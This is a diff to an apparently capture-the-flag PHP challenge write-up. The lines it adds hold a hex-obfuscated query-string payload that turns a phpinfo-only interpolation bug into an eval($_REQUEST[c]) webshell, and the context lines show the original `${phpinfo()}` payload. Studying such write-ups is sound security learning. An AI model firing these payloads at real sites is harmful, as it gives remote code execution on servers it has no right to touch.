@@ -12,6 +12,11 @@ PHP中花括号的用法：字符串`${foobar}`中的foobar会被当作变量来
 
 payload:`http://foobar/challenge2.php?str=${${phpinfo()}}`
 
+> [将只能执行phpinfo的漏洞转换为一句话木马](http://www.jianshu.com/p/dd72566ca4df)
+```
+?str=${eval(substr(hex2bin(ff6576616c28245f524551554553545b635d293b),1,19))}&c=phpinfo();
+```
+
 ### challenge3:
 利用PHP和MySQL中浮点数精度不同的特性来做，在PHP中`1.0000000000001 != 1`而在MySQL中`1.0000000000001 == 1`
 
